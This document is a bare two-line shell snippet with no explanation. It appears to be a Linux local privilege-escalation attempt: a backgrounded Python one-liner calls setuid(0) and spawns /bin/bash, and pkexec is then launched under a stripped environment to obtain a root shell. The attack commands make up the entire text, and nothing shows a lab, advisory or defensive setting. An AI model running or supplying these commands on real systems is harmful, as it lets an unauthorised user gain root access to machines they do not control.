python3 -c 'import os;from ctypes import CDLL;libc=CDLL("libc.so.6");libc.setuid(0);os.system("/bin/bash")' &
env -i SHELL=/bin/bash XAUTHORITY=/dev/null PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin /usr/bin/pkexec
